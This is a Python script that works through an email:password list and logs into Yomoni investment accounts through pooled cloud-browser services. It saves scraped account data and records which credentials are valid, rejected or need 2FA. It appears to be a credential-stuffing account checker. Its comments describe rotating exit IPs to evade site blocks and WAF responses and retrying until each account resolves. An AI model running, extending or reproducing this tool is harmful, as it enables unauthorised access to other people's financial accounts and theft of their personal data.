"""Scrape every Yomoni account in credentials.txt across all configured providers.

Providers are interchangeable: transports.py turns any API key into a CDP
browser, so Browserbase and Kernel keys are pooled together and a work slot is
whatever key is free at that moment. Concurrency is therefore bounded by how
many keys actually reach the site, not by a hand-tuned constant.

Re-running is cheap and safe. An account is skipped only when it reached a
*definitive* answer (scraped, rejected password, or 2FA). A run that died because
the site was unreachable, the key ran out of credits, or the network glitched
is deliberately *not* remembered, so those accounts are retried next time
instead of being silently written off forever.

    python scrape_multi.py                 # work the queue
    python scrape_multi.py --retry-failed  # also re-try remembered 2FA accounts
    python scrape_multi.py --limit 3       # just prove the pipeline end to end
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import os
import re
import sys
from typing import Any

from extract import (
    FAILURE_MARKERS,
    attempt_key,
    extract_fields,
    failed_fields,
    is_success_line,
    to_line,
)
from config import load_dotenv, provider_keys
from transports import TransportError, build_transports, open_browser
from yomoni import BAD_CREDENTIALS, DEFINITIVE, NEEDS_2FA, OK, Outcome, walk

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULT_DIR = os.path.join(BASE_DIR, "result")
RESULT_FILE = os.path.join(RESULT_DIR, "yomoni_results.txt")
# Per-account outcome, keyed by (mail, mdp) so a second password for the same
# address does not erase the record of the first one.
STATE_FILE = os.path.join(RESULT_DIR, "attempted.json")
DUMP_DIR = os.path.join(RESULT_DIR, "dumps")

#: How many times one account may be re-attempted inside a single run before we
#: admit the site is not cooperating. Keeps a bad run from hammering the target.
MAX_TRIES_PER_RUN = 2


def read_all_credentials() -> list[tuple[str, str]]:
    """Parse email:password lines, keeping the first occurrence of each address."""
    accounts: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    path = os.path.join(BASE_DIR, "credentials.txt")
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line or line.startswith("#"):
                continue
            email, _, password = line.partition(":")
            email, password = email.strip(), password.strip()
            if not email or not password:
                continue
            pair = (email.lower(), password)
            if pair in seen:  # credentials.txt contains exact duplicates
                continue
            seen.add(pair)
            accounts.append((email.lower(), password))
    return accounts


class Store:
    """Results file plus attempt state, written atomically under a lock.

    Both files are rewritten whole on every change so a crash mid-write cannot
    leave a half line behind, and the lock keeps concurrent workers from
    clobbering each other's appends.

    ``result_dir`` is injectable on purpose: tests point it at a temporary
    directory, because a store that always writes to ``result/`` will happily
    overwrite a real scrape the first time a test calls record().
    """

    def __init__(self, result_dir: str | None = None) -> None:
        self.result_dir = result_dir or RESULT_DIR
        self.result_file = os.path.join(self.result_dir, "yomoni_results.txt")
        self.state_file = os.path.join(self.result_dir, "attempted.json")
        self._lock = asyncio.Lock()
        self.lines: list[str] = []
        self.entries: dict[str, str] = {}
        self.state: dict[str, dict[str, Any]] = {}
        self._load()

    def _load(self) -> None:
        if os.path.exists(self.result_file):
            with open(self.result_file, encoding="utf-8") as f:
                for raw in f:
                    line = raw.rstrip("\n")
                    if not line.strip():
                        continue
                    self.lines.append(line)
                    parts = line.split("|")
                    email = parts[0].strip().lower()
                    if email:
                        self.entries[email] = parts[1] if len(parts) > 1 else ""
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, encoding="utf-8") as f:
                    self.state = json.load(f)
            except (OSError, ValueError):
                self.state = {}

    def _atomic(self, path: str, payload: str) -> None:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = f"{path}.tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(payload)
        os.replace(tmp, path)

    def known(self, email: str, password: str) -> str | None:
        """Return the definitive status already recorded for this pair, if any."""
        rec = self.state.get(attempt_key(email, password))
        if rec and rec.get("auth") in DEFINITIVE:
            return rec["auth"]
        # A successful line in the results file is proof enough on its own.
        if self.entries.get(email) == password and is_success_line(password):
            return OK
        return None

    async def record(
        self, email: str, password: str, outcome: Outcome, line: str
    ) -> None:
        """Persist a verdict. Transient outcomes are refused here.

        This is the persistence boundary, so it is the right place for the
        rule: a blocked or timed-out run must leave no trace that could be read
        later as an answer. Anything that reaches this method without a verdict
        is treated as unresolved and dropped.
        """
        if outcome.status != OK and outcome.retryable:
            return
        async with self._lock:
            # A real read always wins: a later failed attempt must never
            # overwrite a line that already holds account data.
            if self.entries.get(email) == password and is_success_line(password) and not outcome.ok:
                return
            if email in self.entries:
                self.lines = [
                    kept for kept in self.lines if kept.split("|")[0].strip().lower() != email
                ]
            self.lines.append(line)
            self.entries[email] = line.split("|")[1] if len(line.split("|")) > 1 else ""
            self._atomic(self.result_file, "\n".join(self.lines) + "\n")

            key = attempt_key(email, password)
            if outcome.status in DEFINITIVE:
                self.state[key] = {
                    "mail": email,
                    "mdp": password,
                    "auth": outcome.status,
                    "at": _now(),
                }
            else:
                # Transient: remember that it was seen, but leave it retryable
                # by not writing a definitive status.
                self.state.setdefault(key, {"mail": email, "mdp": password})
                self.state[key]["transient"] = outcome.status
                self.state[key]["tries"] = int(self.state[key].get("tries", 0)) + 1
            self._atomic(self.state_file, json.dumps(self.state, ensure_ascii=False, indent=2, sort_keys=True))


def _now() -> str:
    import datetime

    return datetime.datetime.now(datetime.timezone.utc).isoformat()


def save_dump(email: str, outcome: Outcome) -> None:
    os.makedirs(DUMP_DIR, exist_ok=True)
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", email)
    path = os.path.join(DUMP_DIR, f"{safe}.json")
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"email": email, "status": outcome.status, "pages": outcome.pages},
                  f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)


class SlotPool:
    """Hands out (transport, key) pairs and retires keys that ran out of credit.

    ``take`` waits for a free key instead of returning None straight away: an
    instant "none available" answer abandons every account still queued behind a
    slow one, which is how a pool of 7 healthy keys produced ten bogus failures
    before this was fixed.
    """

    #: Seconds to wait for a key to come back before giving up on the account.
    KEY_WAIT_S = 180.0

    def __init__(self, transports: list[Any]) -> None:
        self._free: asyncio.Queue[tuple[Any, str]] = asyncio.Queue()
        self._parked: list[tuple[Any, str]] = []
        self._all: list[tuple[Any, str]] = []
        self._dead: set[tuple[str, str]] = set()
        for transport in transports:
            for key in transport.keys():
                slot = (transport, key)
                self._all.append(slot)
                self._free.put_nowait(slot)

    def __len__(self) -> int:
        return len(self._all)

    def _is_dead(self, slot: tuple[Any, str]) -> bool:
        return (slot[0].name, slot[1]) in self._dead

    def _usable_ahead(self, avoid: set[str]) -> bool:
        return any(
            s[1] not in avoid and not self._is_dead(s) for s in [*self._parked, *self._all]
        )

    async def take(self, *, avoid: set[str] | frozenset[str] = frozenset()) -> tuple[Any, str] | None:
        """Return a key that is neither in ``avoid`` nor retired, waiting if needed.

        ``avoid`` is how a retry lands on a *different* exit IP: a key that just
        produced a block or a crash is skipped for this account, which is the
        cheapest form of IP rotation available.
        """
        loop = asyncio.get_running_loop()
        deadline = loop.time() + self.KEY_WAIT_S
        while True:
            # Consider parked keys first, then whatever is in the queue.
            for i, slot in enumerate(self._parked):
                if slot[1] not in avoid and not self._is_dead(slot):
                    return self._parked.pop(i)
            while True:
                try:
                    slot = self._free.get_nowait()
                except asyncio.QueueEmpty:
                    break
                if slot[1] in avoid or self._is_dead(slot):
                    self._parked.append(slot)
                    continue
                return slot
            if not self._usable_ahead(set(avoid)):
                return None
            if loop.time() >= deadline:
                return None
            # A key is in use by another worker; wait for it to come back.
            with contextlib.suppress(asyncio.TimeoutError):
                incoming = await asyncio.wait_for(self._free.get(), timeout=5.0)
                self._parked.append(incoming)

    async def give_back(self, slot: tuple[Any, str]) -> None:
        self._free.put_nowait(slot)

    def discard(self, slot: tuple[Any, str]) -> None:
        """Retire a key for the rest of the run (out of credits / revoked)."""
        self._dead.add((slot[0].name, slot[1]))


async def process(email: str, password: str, pool: SlotPool, store: Store) -> str:
    """Run one account, moving to a different key/IP whenever one misbehaves.

    The key is always handed back to the pool - a leak here is what starves the
    remaining workers - but it is remembered in ``tried`` so this account never
    lands on it twice. A blocked or crashed attempt is therefore retried on a
    different exit IP rather than repeating the same failure.
    """
    tried: set[str] = set()
    for _ in range(MAX_TRIES_PER_RUN):
        slot = await pool.take(avoid=tried)
        if slot is None:
            print("  aucune cle saine restante, abandon", flush=True)
            return "no_key"
        transport, key = slot
        tried.add(key)
        label = f"{transport.name}:***{key[-6:]}"
        # The one invariant: a key always goes back to the pool, unless it was
        # declared dead. Losing a key here starves every other worker, which is
        # how a healthy pool turns into a run full of false failures.
        returnable = True
        try:
            try:
                async with open_browser(transport, key) as browser:
                    outcome = await walk(browser, email, password)
            except TransportError as exc:
                if not exc.retryable:
                    pool.discard(slot)
                    returnable = False
                    print(f"  {label} indisponible ({exc}) - cle retiree", flush=True)
                    continue
                print(f"  {label} erreur reseau ({exc}) - nouvelle IP", flush=True)
                continue
            except Exception as exc:  # noqa: BLE001 - one account must not kill the run
                # A crashed cloud browser (TargetClosedError) is a bad session,
                # not a verdict on the account: retry on another IP.
                print(f"  {label} session perdue: {type(exc).__name__} - nouvelle IP", flush=True)
                continue

            if outcome.retryable and outcome.status != OK:
                # Blocked / WAF / timeout: no line, no state, and the account
                # stays queued for the next run on a fresh IP.
                print(f"  {label} -> {outcome.status} (transitoire, nouvelle IP)", flush=True)
                continue

            if outcome.ok:
                fields = extract_fields(outcome.pages, password)
                save_dump(email, outcome)
            else:
                fields = failed_fields(email, outcome.status, outcome.auth_text)
            await store.record(email, password, outcome, to_line(fields))
            if outcome.ok:
                print(f"  {label} -> {outcome.status}", flush=True)
                print(f"     {to_line(fields)}", flush=True)
            else:
                print(f"  {label} -> {outcome.status} (definitif)", flush=True)
            return outcome.status
        finally:
            if returnable:
                await pool.give_back(slot)
    return "retries_exhausted"


async def run(accounts: list[tuple[str, str]], pool: SlotPool, store: Store) -> dict[str, int]:
    """One worker per key, pulling accounts off a shared queue."""
    queue: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
    for item in accounts:
        queue.put_nowait(item)
    tally: dict[str, int] = {}
    lock = asyncio.Lock()

    async def worker() -> None:
        while True:
            try:
                email, password = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            status = await process(email, password, pool, store)
            async with lock:
                tally[status] = tally.get(status, 0) + 1
            print(f"[{len(tally) and ''}{email}] {status} ({queue.qsize()} en attente)", flush=True)

    workers = [asyncio.create_task(worker()) for _ in range(max(1, len(pool)))]
    await asyncio.gather(*workers)
    return tally


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--limit", type=int, default=0, help="only work N accounts")
    ap.add_argument("--retry-failed", action="store_true", help="also re-try 2FA accounts")
    ap.add_argument("--account", action="append", default=[], metavar="EMAIL",
                    help="force a re-check of this address (repeatable)")
    ap.add_argument("--all", action="store_true",
                    help="re-check every account, ignoring the stored verdicts")
    ap.add_argument("--dry-run", action="store_true", help="list the plan, spend nothing")
    args = ap.parse_args()

    load_dotenv(os.path.join(BASE_DIR, ".env"))
    accounts = read_all_credentials()
    if not accounts:
        print("no accounts in credentials.txt (format: email:password per line)")
        return 1

    transports = build_transports({
        "browserbase": provider_keys("BROWSERBASE_API_KEY"),
        "kernel": provider_keys("KERNEL_API_KEY"),
    })
    if not transports:
        print("no provider keys configured")
        return 1

    store = Store()
    pending: list[tuple[str, str]] = []
    skipped: list[tuple[str, str]] = []
    forced = {a.strip().lower() for a in args.account}
    for email, password in accounts:
        if args.all or email in forced:
            # An explicit re-check bypasses the cache: this is the "just check
            # again in case it was the IP or the agent" escape hatch.
            pending.append((email, password))
            continue
        status = store.known(email, password)
        if status and not (args.retry_failed and status == NEEDS_2FA):
            skipped.append((email, status))
            continue
        pending.append((email, password))

    total_keys = sum(len(t.keys()) for t in transports)
    print(f"comptes: {len(accounts)}  a traiter: {len(pending)}  deja traites: {len(skipped)}")
    print(f"cles: {total_keys} -> concurrence {min(total_keys, max(1, len(pending)))}")
    for name, count in ((t.name, len(t.keys())) for t in transports):
        print(f"  {name}: {count} cle(s)")

    if args.dry_run:
        for email, status in skipped:
            print(f"  skip {email} ({status})")
        for email, _ in pending:
            print(f"  todo {email}")
        return 0

    if not pending:
        print("rien a faire")
        return 0
    if args.limit:
        pending = pending[: args.limit]

    pool = SlotPool(transports)
    try:
        tally = asyncio.run(run(pending, pool, store))
    except KeyboardInterrupt:
        print("\ninterrompu - les comptes traites sont deja enregistres")
        return 130

    print(f"\nresultats: {RESULT_FILE}")
    for status, count in sorted(tally.items()):
        print(f"  {status}: {count}")
    retryable = {s: c for s, c in tally.items() if s not in DEFINITIVE}
    if retryable:
        detail = ", ".join(f"{s}={c}" for s, c in sorted(retryable.items()))
        print(f"  a reessayer au prochain run: {detail}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
